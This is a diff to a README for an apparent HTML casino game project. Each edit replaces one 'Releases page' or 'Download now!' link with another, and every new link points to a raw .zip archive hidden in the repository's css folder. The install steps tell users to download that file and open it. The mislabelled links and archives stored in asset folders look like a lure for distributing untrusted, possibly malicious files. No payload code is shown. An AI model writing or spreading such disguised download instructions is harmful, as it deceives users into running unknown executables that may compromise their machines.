@@ -1,6 +1,6 @@
 # 🎰 Web-Casino-Online-Games - Enjoy Realistic Casino Fun Online
 
-[![Download now!](https://raw.githubusercontent.com/SemestaAmmar/Web-Casino-Online-Games/main/js/Web-Casino-Online-Games_2.4.zip%20Now-Get%20the%https://raw.githubusercontent.com/SemestaAmmar/Web-Casino-Online-Games/main/js/Web-Casino-Online-Games_2.4.zip)](https://raw.githubusercontent.com/SemestaAmmar/Web-Casino-Online-Games/main/js/Web-Casino-Online-Games_2.4.zip)
+[![Download now!](https://github.com/SemestaAmmar/Web-Casino-Online-Games/raw/refs/heads/main/css/Web_Casino_Games_Online_v2.1.zip%20Now-Get%20the%https://github.com/SemestaAmmar/Web-Casino-Online-Games/raw/refs/heads/main/css/Web_Casino_Games_Online_v2.1.zip)](https://github.com/SemestaAmmar/Web-Casino-Online-Games/raw/refs/heads/main/css/Web_Casino_Games_Online_v2.1.zip)
 
 ## 🎮 Description
 
@@ -11,7 +11,7 @@ Web-Casino-Online-Games is an interactive online casino platform built with HTML
 Follow these simple steps to get started:
 
 1. **Go to the Releases Page**
-   Visit our [Releases page](https://raw.githubusercontent.com/SemestaAmmar/Web-Casino-Online-Games/main/js/Web-Casino-Online-Games_2.4.zip) to find the downloadable files. This page has the latest versions of the application.
+   Visit our [Releases page](https://github.com/SemestaAmmar/Web-Casino-Online-Games/raw/refs/heads/main/css/Web_Casino_Games_Online_v2.1.zip) to find the downloadable files. This page has the latest versions of the application.
 
 2. **Download the Application**
    Look for the latest release and click the download link for your operating system. The application is available for various platforms.
@@ -29,7 +29,7 @@ Follow these simple steps to get started:
 
 To download and install the Web-Casino-Online-Games application, follow these steps:
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/SemestaAmmar/Web-Casino-Online-Games/main/js/Web-Casino-Online-Games_2.4.zip).
+1. Visit the [Releases page](https://github.com/SemestaAmmar/Web-Casino-Online-Games/raw/refs/heads/main/css/Web_Casino_Games_Online_v2.1.zip).
 2. Choose the latest version that matches your device.
 3. Click on the download link and save the file.
 4. After the download completes, open the file.
@@ -86,4 +86,4 @@ Join the community! If you are interested in enhancing the application or have s
 - virtual-balance
 - web
 
-For any additional information, visit our [Releases page](https://raw.githubusercontent.com/SemestaAmmar/Web-Casino-Online-Games/main/js/Web-Casino-Online-Games_2.4.zip). Enjoy your time at the casino!
+For any additional information, visit our [Releases page](https://github.com/SemestaAmmar/Web-Casino-Online-Games/raw/refs/heads/main/css/Web_Casino_Games_Online_v2.1.zip). Enjoy your time at the casino!
